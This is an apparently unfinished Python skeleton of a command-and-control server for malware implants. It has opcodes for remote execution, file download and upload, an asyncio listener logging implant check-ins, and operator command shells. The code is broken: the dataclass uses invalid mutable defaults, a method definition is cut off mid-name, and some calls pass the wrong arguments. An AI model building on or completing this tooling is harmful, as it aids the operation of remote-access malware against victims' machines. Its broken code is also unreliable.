#!/usr/bin/python3

import socket
import uuid
import struct
import cmd
import uuid
import select
from enum import Enum, IntEnum, auto
import time
import threading
import time
import dataclasses

import asyncio


class OpCodes(IntEnum):
    SETTINGS = 1
    EXEC = auto()
    DOWNLOAD = auto()
    UPLOAD = auto()
    DISCONNECT = auto()
    EXIT = auto()

@dataclasses.dataclass
class ImplantInfo():
    id: str
    interval: int
    settings: dict = {}
    checkins: list[str] = []
    pending_tasks: list = []
    finished_tasks: list = []

class C2Server:

    def __init__(self, ip: str = "127.0.0.1", port: int = 31337):
        self.ip = ip
        self.port = port
        self.implants: dict[str:ImplantInfo] = {}
        self.tasks = []

        self.lock = asyncio.Lock()

    async def handle_client(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ):
        checkin = await reader.read(17)
        guid = uuid.UUID(bytes=checkin[:16])

        async with self.lock:
            if guid not in self.implants:
                self.implants[guid] = ImplantInfo(guid, checkins=[time.asctime()])
            else:
                self.implants[guid].checkins.append(time.asctime())

        writer.close()
        await writer.wait_closed()

    async def start(self):
        server = await asyncio.start_server(self.handle_client, self.ip, self.port)

        async with server:
            await server.serve_forever()

    def configure_implant(self, id, interval):
        task = {"id":uuid.uuid4(), "command": OpCodes.SETTINGS.value, "params":{"interval":interval},}

        if id in self.implants:
            self.implants[id].pending_tasks.append(task)
        

    def get_checkins(self):
        checkins = {guid: self.implants[guid].checkins for guid in self.implants}
        return checkins
    
    def get_implants(self):
        return list(self.implants.keys())

class ImplantCLI(cmd.Cmd):

    def __init__(self, id: str, server: C2Server):
        super().__init__()
    
        self.id = id
        self.server = server
        self.prompt = f"{id} >>>"

    def do_configure(self, args):
        self.server.configure_implant(self.id, args[0])




class C2CLI(cmd.Cmd):

    def __init__(self, ip, port):
        super().__init__()

        self.prompt = "c2>>>"

        cli_thread = threading.Thread(target=self.__start_cli_thread)
        cli_thread.start()

        self.server = C2Server(ip, port)
        asyncio.run(self.server.start())

    def __start_cli_thread(self):
        self.cmdloop()

    def do_configure_implant(self, args):
        self.server.configure_implant(args)

    def do_list_checkins(self, _):
        checkins = self.server.get_checkins()
        for iid in checkins:
            print(f"Implant: {iid}")
            for time in checkins[iid]:
                print(f"\t {time}")

    def do_list_implants(self, _):
        print(self.server.get_implants())

    def do_select_


if __name__ == "__main__":
    try:
        c2 = C2CLI("127.0.0.1", 31337)
    except KeyboardInterrupt as exc:
        raise SystemExit from exc
